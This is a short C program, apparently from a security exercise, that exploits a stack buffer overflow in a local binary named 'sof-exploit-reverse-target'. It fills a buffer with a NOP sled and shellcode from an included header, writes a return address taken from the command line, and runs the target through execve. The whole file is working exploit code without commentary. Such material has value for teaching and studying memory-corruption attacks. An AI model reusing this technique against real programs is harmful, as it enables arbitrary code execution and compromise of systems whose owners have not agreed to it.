#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "./sof-exploit-reverse-target"
#define SIZE 73
#define NOP 0x90

int main(int argc, char**argv) {
	char *args[3];
	char *env[1];
	char *ptr;
	long *addr_ptr, addr;
	int i;
	char buff[SIZE];

	addr = strtoll(argv[1],NULL,16);

	for (i = 0; i < SIZE; i++)
		buff[i] = NOP;
	addr_ptr = (long *) (buff + SIZE -5);
	*addr_ptr = addr;
	ptr = buff + (SIZE - 5 - strlen(shellcode));
	for (i = 0; i < strlen(shellcode); i++)
		*(ptr++) = shellcode[i];
	buff[SIZE - 1] = '\0';

	args[0] = TARGET; args[1] = buff; args[2] = NULL;
	env[0] = NULL;
	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");
	return 0;
}
